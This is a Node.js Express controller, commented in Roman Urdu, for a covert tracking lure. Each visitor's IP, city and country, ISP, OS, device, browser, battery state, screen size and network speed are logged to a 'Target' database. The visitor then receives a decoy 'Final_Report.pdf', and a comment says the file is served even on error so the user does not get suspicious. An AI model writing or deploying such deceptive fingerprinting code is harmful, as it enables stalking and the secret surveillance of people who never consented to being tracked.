const Target = require('../models/Target');
const useragent = require('useragent');
const path = require('path');
const { logCapture } = require('../utils/logger');
const axios = require('axios');
exports.renderTracker = (req, res) => {
    res.sendFile(path.join(__dirname, '../public/tracker.html'));
};

exports.captureAndServe = async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const agent = useragent.parse(req.headers['user-agent']);
        
        // ⚡ YE LINE ZAROORI HAI: Taki variables undefined na hon
        const { batteryLevel, isCharging, screenResolution, connectionType, downlink, rtt } = req.body || {};
        let geoData = {};
        try {
            // Hum ip-api use kar rahe hain (Free tier)
            const response = await axios.get(`http://ip-api.com/json/${ip === '::1' ? '' : ip}`);
            geoData = response.data;
        } catch (e) {
            console.log("Geo API Error:", e.message);
        }
        const logData = {
            ip: ip,
            location: `${geoData.city || 'Unknown'}, ${geoData.country || 'Unknown'}`,
            isp: geoData.isp || 'N/A',
            os: agent.os.toString(),
            device: agent.device.toString(),
            browser: agent.toAgent(),
            battery: (batteryLevel && batteryLevel !== "Not Supported") 
            ? `${batteryLevel}% (${isCharging ? 'Charging' : 'Not Charging'})` 
            : 'Not Supported on this Device',
            screen: screenResolution || 'N/A',
            network: `${connectionType} (Speed: ${downlink}, Ping: ${rtt})`,
            time: new Date().toLocaleString()
        };

        logCapture(logData);

        const newLog = new Target({
            ip: ip,
            os: logData.os,
            device: logData.device,
            browser: logData.browser,
            battery: logData.battery,
            screen: logData.screen,
            connectionType,
            downlink,
            rtt,
            city: geoData.city,
            country: geoData.country,
            isp: geoData.isp,
            timezone: geoData.timezone,
            userAgent: req.headers['user-agent']
        });

        await newLog.save();

        // ⚡ Redirect handle karna agar POST request hai
        if (req.method === 'POST') {
            return res.json({ success: true, redirectUrl: '/api/download-file' });
        }

        // ⚡ GET request ke liye direct download
        const filePath = path.join(__dirname, '../public/report.pdf');
        res.download(filePath, 'Final_Report.pdf');

    } catch (err) {
        console.error("Tracking Error:", err);
        // Error ki surat mein bhi file serve karein taake user ko shak na ho
        const filePath = path.join(__dirname, '../public/report.pdf');
        if (req.method === 'POST') {
            return res.json({ success: false, redirectUrl: '/api/download-file' });
        }
        res.download(filePath);
    }
};
// ⚡ New Function: Redirect ke baad file download karwane ke liye
exports.serveFile = (req, res) => {
    const filePath = path.join(__dirname, '../public/report.pdf');
    res.download(filePath, 'Final_Report.pdf');
};

exports.getLogs = async (req, res) => {
    const logs = await Target.find().sort({ openedAt: -1 });
    res.json(logs);
};